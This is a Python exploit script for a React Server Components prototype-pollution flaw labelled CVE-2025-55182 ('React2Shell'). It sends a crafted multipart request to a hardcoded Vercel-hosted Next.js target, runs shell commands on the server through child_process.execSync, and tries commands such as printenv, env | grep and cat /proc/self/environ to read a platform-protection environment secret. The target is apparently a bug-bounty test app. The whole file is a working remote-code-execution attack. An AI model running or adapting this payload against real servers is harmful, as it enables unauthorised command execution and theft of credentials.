#!/usr/bin/env python3
"""
React2Shell (CVE-2025-55182) Exploit
Based on actual POC from maple3142 and p3ta00
"""

import requests

TARGET = "https://nextjs-cve-hackerone.vercel.app"

def exploit_react2shell(command):
    """
    Send React2Shell exploit payload using prototype pollution
    """

    # Multipart form data boundary
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    # Build the malicious payload using prototype chain traversal
    payload_0 = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": f"process.mainModule.require('child_process').execSync('{command}');",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }

    # Construct multipart body
    import json
    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += json.dumps(payload_0) + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += '"$@0"\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': 'x',
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    print(f"[*] Sending exploit payload...")
    print(f"[*] Command: {command}")

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=10)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response length: {len(response.text)}")
        print(f"[+] Response preview: {response.text[:500]}")

        # Check for error digest (signature of successful exploitation attempt)
        if 'E{"digest"' in response.text or response.status_code == 500:
            print("[!!!] Potential exploitation indicator found!")

        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Try to extract the environment variable
print("="*70)
print("React2Shell Exploit - Prototype Pollution Vector")
print("="*70)

# Try various command variations
commands = [
    "printenv VERCEL_PLATFORM_PROTECTION",
    "echo $VERCEL_PLATFORM_PROTECTION",
    "env | grep VERCEL",
    "cat /proc/self/environ | tr '\\0' '\\n' | grep VERCEL",
]

for cmd in commands:
    print(f"\n[*] Attempting command: {cmd}")
    result = exploit_react2shell(cmd)
    if result and result.status_code == 500:
        print("\n[!!!] Server returned 500 - exploit may have triggered!")
        print(result.text)
        break
